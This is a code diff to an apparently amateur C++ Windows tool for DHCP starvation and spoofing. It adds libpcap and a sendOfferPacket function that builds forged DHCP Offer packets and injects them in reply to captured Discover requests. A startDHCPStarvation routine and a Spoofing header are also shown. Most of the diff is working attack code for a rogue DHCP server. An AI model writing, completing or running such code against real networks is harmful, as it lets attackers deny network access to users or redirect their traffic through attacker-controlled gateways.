@@ -1,10 +1,16 @@
 #define _CRT_SECURE_NO_WARNINGS
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define HAVE_REMOTE
+#define WPCAP
 
 #include "Headers.h"
 #include "Packets.h"
 #include "Utils.h"
 #include "Spoofing.h"
+
+#include <pcap.h>
+#pragma comment(lib, "wpcap.lib")
+#pragma comment(lib, "packet.lib")
 
 #include <time.h>
 #include <iostream>
@@ -13,6 +19,7 @@
 #include <WS2tcpip.h>
 #pragma pack(1)
 #pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib,"wpcap.lib")
 
 void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP);
 
@@ -49,6 +56,7 @@ void sendDiscoverPacket(AddressInfo& info)
 		sizeof(dst)
 	);
 	delete[] raw_packet;
+	closesocket(s);
 }
 
 void recvDHCPPsackets(AddressInfo& info)
@@ -74,7 +82,7 @@ void recvDHCPPsackets(AddressInfo& info)
 	s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //Create a RAW socket
 
 	if (s == SOCKET_ERROR)
-		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
+		std::cout << "Socket error <" << WSAGetLastError() << ">" << WSACleanup() << std::endl;
 
 	bind(s, (sockaddr*)&sockinfo, sizeof(sockinfo));
 
@@ -88,7 +96,7 @@ void recvDHCPPsackets(AddressInfo& info)
 	error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);
 
 	if (error == SOCKET_ERROR)
-		std::cout << "recv error: " << WSAGetLastError() << std::endl;
+		std::cout << " recv error: " << WSAGetLastError() << WSACleanup() << std::endl;
 
 	//std::cout << inet_ntoa(dst.sin_addr) << std::endl;
 	getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
@@ -97,13 +105,42 @@ void recvDHCPPsackets(AddressInfo& info)
 	{
 		std::cout << inet_ntoa(sockinfo.sin_addr) << std::endl;
 		if (checkForDHCP(pDHCP))
-		{
-			std::cout << "recv: ";
-			printHex(pDHCP.chaddr, sizeof pDHCP.chaddr);
-		}
+			sendOfferPacket(pDHCP, info);
 	}
 	delete[] raw_packet;
+	closesocket(s);
 }
+
+void sendOfferPacket(DHCP_header& hHeader, AddressInfo& info)
+{
+	pcap_t* sock = pcap_open(getDeviceName(info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
+	
+	char* raw_packet = new char[65536];
+	if (!sock)
+		std::cout << "error in pcap socket" << std::endl;
+	
+	CreateDHCPOfferPacket(raw_packet, (void*)&hHeader, info);
+
+	std::cout << "check" << std::endl;
+	printHex((char*)&((Ethernet_header*)((u_char*)raw_packet))->frame_type, 2);
+	printIP(((IP_header*)((u_char*)raw_packet + sizeof(Ethernet_header)))->ip_destaddr);
+	std::cout << ntohs(((UDP_header*)((u_char*)raw_packet + sizeof(Ethernet_header) + sizeof(IP_header)))->dst_port) << std::endl;
+	printHex(((DHCP_header*)((u_char*)raw_packet + sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header)))->chaddr, 6);
+	
+	if (pcap_sendpacket(
+		sock,
+		(u_char*)raw_packet,
+		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header)
+	) != 0)
+		std::cout << "error " <<  pcap_geterr(sock) << std::endl;
+
+#if _DEBUG
+	std::cout << "sent" << std::endl;
+#endif
+	delete[] raw_packet;
+	pcap_close(sock);
+}
+
 
 void startDHCPStarvation(AddressInfo& info)
 {
